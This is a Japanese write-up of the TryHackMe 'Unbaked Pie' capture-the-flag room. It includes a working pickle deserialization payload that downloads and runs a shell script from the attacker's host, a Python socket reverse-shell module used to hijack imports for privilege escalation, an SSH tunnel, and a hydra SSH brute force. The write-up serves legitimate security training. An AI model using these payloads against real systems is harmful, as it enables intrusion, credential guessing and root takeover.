# Unbaked Pie CTF

https://tryhackme.com/room/unbakedpie

## Enumeration

```shell
TARGET=10.65.161.26
sudo bash -c "echo $TARGET   pie.thm >> /etc/hosts"
```

### ポートスキャン

--min-rate を設定しないと何も出てこなかった。

```shell
root@ip-10-65-106-209:~# nmap -v -p- -Pn --min-rate 10000 $TARGET

PORT     STATE SERVICE
5003/tcp open  filemake
```

```sh
sudo nmap -sV -p5003 $TARGET

PORT     STATE SERVICE    VERSION
5003/tcp open  filemaker?
```

```sh
root@ip-10-65-106-209:~# nikto -p 5003 -T 1 2 3 -h $TARGET
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.65.134.175
+ Target Hostname:    10.65.134.175
+ Target Port:        5003
+ Start Time:         2025-11-26 05:33:40 (GMT0)
---------------------------------------------------------------------------
+ Server: WSGIServer/0.2 CPython/3.8.6
+ Cookie csrftoken created without the httponly flag
+ Uncommon header 'x-content-type-options' found, with contents: nosniff
+ Uncommon header 'referrer-policy' found, with contents: same-origin
+ Uncommon header 'x-frame-options' found, with contents: DENY
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ 1707 items checked: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2025-11-26 05:34:00 (GMT0) (20 seconds)
---------------------------------------------------------------------------
```

## 5003

ユーザー登録に少し癖があるが、下記のような内容で登録できる。

```
thm@thm.com
passwordthm
```

### SSTI

ユーザー登録後、レシピを登録できる。4項目を入力。

- title
- body
- slug
- image

title, body は `{{7*'7'}}` と入れてもそのまま表示されただけだった。  
slug は URL の Path になり、画面上も表示されているので気になるが、`{` などの特殊文字を入れるとレシピ登録が成功しない。断念。

### search cookie

検索窓で検索すると、`search_cookie=gASVCgAAAAAAAACMBmFiY2RlZpQu` のような cookie がセットされる。

Base64デコードすると、検索した文字列を含むバイナリになる。

https://mark0.net/onlinetrid.py#google_vignette でデータを判別すると、`Python Pickle serialized data (v4)	` という結果だった。

### pickleデシリアライズ

デシリアライズさせるペイロードを作成

```python
import pickle, os, base64
class P(object):
    def __reduce__(self):
        return (os.system,("curl http://192.168.131.69:8000/sh.sh -o /tmp/sh.sh; chmod +x /tmp/sh.sh; /tmp/sh.sh",))
print(base64.b64encode(pickle.dumps(P())))
```

```sh
$ python ./pi.py                                                          
b'gASVbwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjFRjdXJsIGh0dHA6Ly8xOTIuMTY4LjEzMS42OTo4MDAwL3NoLnNoIC1vIC90bXAvc2guc2g7IGNobW9kICt4IC90bXAvc2guc2g7IC90bXAvc2guc2iUhZRSlC4='
```

Cookie置き換え後、もう一度検索を実行したらリバースシェルを取れた。

```sh
$ nc -lnvp 8888
listening on [any] 8888 ...
connect to [192.168.131.69] from (UNKNOWN) [10.65.154.129] 41430
# id
id
uid=0(root) gid=0(root) groups=0(root)
```

## 権限昇格１

```sh
root@8b39a559b296:/home# ls -al
total 28
drwxr-xr-x 1 root root 4096 Oct  3  2020 .
drwxr-xr-x 1 root root 4096 Oct  3  2020 ..
drwxrwxr-x 8 root root 4096 Oct  3  2020 .git
drwxrwxr-x 2 root root 4096 Oct  3  2020 .vscode
-rwxrwxr-x 1 root root   95 Oct  3  2020 requirements.sh
-rwxrwxr-x 1 root root   46 Oct  3  2020 run.sh
drwxrwxr-x 1 root root 4096 Nov 26 07:18 site
```



1. site/db.sqlite3 から5ユーザーのパスワードハッシュを入手。
2. testing ユーザーのみクラック成功。

スタッフでスーパーユーザーなのは、aniqfakhrul だけだがクラックできなかった。

/root/.bash_history に下記が残っていた。ramsey は sqliteにも入っていたが、パスワードは不明。

```sh
ssh ramsey@172.17.0.1
exit
```

nmap の静的バイナリをコピーして 172.17.0.1 に対して実行したら、SSHポートが開いていた。

```sh
root@8b39a559b296:/home# ./nmap -p- -Pn --min-rate 10000 172.17.0.1

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2025-11-27 00:47 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-172-17-0-1.ec2.internal (172.17.0.1)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.0000070s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
5003/tcp open  unknown
MAC Address: 02:42:23:7E:74:84 (Unknown)
```

sshが削除されているので、sshの静的ビルドをコピー、先ほど入手したパスワードを使ったが、`ramsey@172.17.0.1` でログインはできなかった。

SSHトンネリング

```sh
root@8b39a559b296:/home/site# ./ssh -N -R 222:172.17.0.1:22 tunnel@192.168.131.69
```

SSHブルートフォースで、ramsey のパスワードがすぐに割れた。

```sh
$ hydra -l ramsey -P /usr/share/wordlists/rockyou.txt localhost ssh -s 222 -t 30
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-27 11:01:09
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 30 tasks per 1 server, overall 30 tasks, 14344399 login tries (l:1/p:14344399), ~478147 tries per task
[DATA] attacking ssh://localhost:222/
[222][ssh] host: localhost   login: ramsey   password: [REDACTED]
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 6 final worker threads did not complete until end.
[ERROR] 6 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-27 11:01:15
```

ホストOSの ramsey として接続成功。

```sh
ramsey@unbaked:~$ ls -al
total 48
drwxr-xr-x 5 ramsey ramsey 4096 Oct  6  2020 .
drwxr-xr-x 4 root   root   4096 Oct  3  2020 ..
-rw------- 1 root   root      1 Oct  5  2020 .bash_history
-rw-r--r-- 1 ramsey ramsey 3771 Oct  3  2020 .bashrc
drwx------ 3 ramsey ramsey 4096 Oct  3  2020 .cache
drwx------ 4 ramsey ramsey 4096 Oct  3  2020 .local
drwxrwxr-x 2 ramsey ramsey 4096 Oct  3  2020 .nano
-rwxrw-r-- 1 ramsey ramsey 1645 Oct  3  2020 payload.png
-rw-r--r-- 1 ramsey ramsey  655 Oct  3  2020 .profile
-rw-r--r-- 1 root   root     38 Oct  6  2020 user.txt
-rw-r--r-- 1 root   ramsey 4369 Oct  3  2020 vuln.py
```

## 権限昇格２

oliver として vuln.py を実行可能。

```sh
ramsey@unbaked:~$ sudo -l
[sudo] password for ramsey: 
Matching Defaults entries for ramsey on unbaked:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ramsey may run the following commands on unbaked:
    (oliver) /usr/bin/python /home/ramsey/vuln.py
```

vuln.py

```python
ramsey@unbaked:~$ cat vuln.py
#!/usr/bin/python
# coding=utf-8

try:
    from PIL import Image
except ImportError:
    import Image
import pytesseract
import sys
import os
import time

（中略）

                if OPTIONS == 2:
                        animation = ["[■□□□□□□□□□]","[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]

                        print "\r\t\t\t     Waiting to extract..."
                        for i in range(len(animation)):
                            time.sleep(0.5)
                            sys.stdout.write("\r\t\t\t         " + animation[i % len(animation)])
                            sys.stdout.flush()

                        LISTED = pytesseract.image_to_string(Image.open('payload.png')) 

                        TOTAL = eval(LISTED)
                        print "\n\n\t\t\tTotal >> $",TOTAL
                if OPTIONS == 3:
                        credits()
        sys.exit(-1)
```

最初、time.sleep() のインジェクションを試みたが空振り。組み込みモジュールだから？  
pytesseract.image_to_string() はインジェクションできた。

```python
def image_to_string(dummy):
    import socket,subprocess,os;
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
    s.connect(("192.168.131.69",8889));
    os.dup2(s.fileno(),0);
    os.dup2(s.fileno(),1);
    os.dup2(s.fileno(),2);
    import pty;
    pty.spawn("/bin/sh")
```

リバースシェル取得成功。

```sh
$ nc -lnvp 8889     
listening on [any] 8889 ...
connect to [192.168.131.69] from (UNKNOWN) [10.64.168.5] 37694
$ id
id
uid=1002(oliver) gid=1002(oliver) groups=1002(oliver),1003(sysadmin)
```

## 権限昇格３

/opt/dockerScript.py を root で実行できる。SETENVが付いていることに注意。

```sh
oliver@unbaked:/home/oliver$ sudo -l
Matching Defaults entries for oliver on unbaked:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User oliver may run the following commands on unbaked:
    (root) SETENV: NOPASSWD: /usr/bin/python /opt/dockerScript.py
```

```sh
oliver@unbaked:/home/oliver$ ls -al /opt/dockerScript.py
-rwxr-x--- 1 root sysadmin 290 Oct  3  2020 /opt/dockerScript.py
```

dockerScript.py。先ほどと同様に、docker.from_env()をインジェクションできる。

```python
oliver@unbaked:/home/oliver$ cat /opt/dockerScript.py
import docker

# oliver, make sure to restart docker if it crashes or anything happened.
# i havent setup swap memory for it
# it is still in development, please dont let it live yet!!!
client = docker.from_env()
client.containers.run("python-django:latest", "sleep infinity", detach=True)
```

先ほどと同じやり方（ただし、PYTHONPATH を設定）で、root昇格成功。

```sh
oliver@unbaked:/home/oliver$ sudo PYTHONPATH=/home/oliver /usr/bin/python /opt/dockerScript.py
```

```sh
$ nc -lnvp 8890           
listening on [any] 8890 ...
connect to [192.168.131.69] from (UNKNOWN) [10.64.168.5] 36932
# id
id
uid=0(root) gid=0(root) groups=0(root)
```

## 振り返り

- 体感としては Hard レベル。
- nmap で --min-rate を設定しないと何も出てこなかった。
- search_cookie は想像しにくい仕様。
- SSHバイナリコピー、SSHトンネリング、SSHブルートフォースのコンボは初。
- time.sleep() をインジェクションできないのは勉強になった。
- ウォークスルーでは、トンネリングに [Chisel](https://github.com/jpillora/chisel) を使っていた。

## Tags

#tags:デシリアライズ #tags:ブルートフォース #tags:トンネリング
